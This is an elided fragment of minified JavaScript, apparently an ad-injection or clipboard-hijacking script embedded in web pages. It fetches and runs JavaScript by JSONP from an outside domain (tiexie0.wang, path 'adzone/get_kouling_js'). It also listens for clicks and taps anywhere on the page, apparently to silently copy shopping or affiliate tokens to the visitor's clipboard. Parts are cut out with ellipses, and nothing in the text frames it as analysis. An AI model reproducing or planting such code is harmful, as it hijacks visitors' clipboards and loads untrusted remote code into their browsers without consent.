	...
	var g = {
		...
		init: function() {
			...
			if (null == a.sGet("amb_jd_open")) {
				...
				a._ajax("//tiexie0.wang/adzone/get_kouling_js?callback=jsonp" + b, {
					f:a.id,
					h:a.hasload,
		...
		listenClick: function() {
			for (var a = this, b = 0; b < a.trigger.length; b++) a.listener.push(a.listenNode(a.trigger[b], "click", function(b) {
				return a.onClick(b, "click")
			}))
		},
		listenTouchend: function() {
			for (var a = this, b = 0; b < a.trigger.length; b++) a.listenerTouchend.push(a.listenNode(a.trigger[b], "touchend", function(b) {
		...
		onClick: function(a, b) {
			...
			"INPUT" != a.target.nodeName && "TEXTAREA" != a.target.nodeName && ((new h(this.text, this.action, function(a) {
				a ? c.cp("1") : c.cp("2")
			})).start(), "click" == b ? (this.listenerD = !0, this.listener.forEach(function(a, b) {
				a.destroy()
		...
		randomString: function() {
			var a = "";
			for (i = 0; 7 > i; i++) a += "ABCDEFGHJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(61 * Math.random()));
			return a
		},
		sGet: function(a) {
			try {
		...
		parseData: function(a) {
			...
			else if ("object" === typeof a) for (var c in a) b += "&" + c + "=" + encodeURIComponent(a[c]);
			b += "&_time=" + this.now();
			return b = b.substr(1)
		},
		_ajax: function(a, b, c) {
			a = a + (-1 === a.indexOf("?") ? "?" : "&") + this.parseData(b);
			if ((b = /callback=(\w+)/.exec(a)) && b[1]) var e = b[1];
			else e = "jsonp_" + this.now() + "_" + this.rand(), a = a.replace("callback=?", "callback=" + e), a = a.replace("callback=%3F", "callback=" + e);
